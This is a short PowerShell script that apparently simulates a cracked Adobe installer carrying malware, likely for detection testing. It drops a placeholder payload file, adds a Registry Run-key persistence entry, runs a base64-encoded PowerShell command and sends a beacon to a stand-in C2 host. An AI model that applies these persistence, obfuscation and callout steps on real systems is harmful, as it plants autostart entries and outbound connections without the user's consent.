# CrackedInstallerSimulation.ps1
# Simulates behavior of cracked Adobe installer containing malware

# Simulate installer name
$fakeInstaller = "Adobe_Cracked_Setup.exe"
Write-Host "Simulating cracked installer: $fakeInstaller"

# Drop a fake payload to a suspicious directory
$payloadPath = "$env:APPDATA\AdobeUpdate\payload.exe"
New-Item -ItemType Directory -Force -Path "$env:APPDATA\AdobeUpdate" | Out-Null
Set-Content -Path $payloadPath -Value "This is a fake malware payload."
Write-Host "Dropped fake payload at: $payloadPath"

# Simulate persistence via Registry Run key
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -Path $regPath -Name "AdobeUpdater" -Value $payloadPath -PropertyType "String" -Force
Write-Host "Registry persistence added: $regPath\AdobeUpdater -> $payloadPath"

# Simulate malicious PowerShell execution (encoded command)
$psCommand = 'Get-Process | Out-File "$env:TEMP\process_list.txt"'
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psCommand))
Start-Process powershell -ArgumentList "-EncodedCommand $encodedCommand"
Write-Host "Executed obfuscated PowerShell payload."

# Simulate fake C2 communication via HTTP request
Invoke-WebRequest -Uri "http://malicious-fake-domain.test/c2" -UseBasicParsing -ErrorAction SilentlyContinue
Write-Host "Fake C2 beacon sent."

Write-Host "Simulation completed."
